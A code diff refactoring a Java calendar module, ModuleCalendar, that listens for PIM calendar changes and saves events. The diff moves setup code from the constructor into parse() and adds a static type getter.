@@ -42,19 +42,15 @@ public class ModuleCalendar extends BaseModule implements PIMListListener {
     protected static final int SLEEPTIME = 3000;
     protected static final int PERIODTIME = 60 * 60 * 1000;
 
-    protected ModuleCalendar() {
+    public static String getStaticType() {
+        return "calendar";
+    }
 
-        //#ifdef DEBUG
-        debug.trace("TaskAgent");
-        //#endif
-
+    public boolean parse(ConfModule conf) {
         markup = new Markup(this);
 
         setDelay(SLEEPTIME);
         setPeriod(PERIODTIME);
-    }
-
-    public boolean parse(ConfModule conf) {
         return true;
     }
 
@@ -116,11 +112,6 @@ public class ModuleCalendar extends BaseModule implements PIMListListener {
                 markup.createEmptyMarkup();
             }
         }
-    }
-
-    public String getId() {
-        // TODO Auto-generated method stub
-        return null;
     }
 
     private boolean getCalendarList() {
@@ -349,6 +340,7 @@ public class ModuleCalendar extends BaseModule implements PIMListListener {
 
         save((Event) itemNew);
     }
+
     private synchronized void init() {
         if (!Path.isInizialized()) {
             Path.makeDirs();
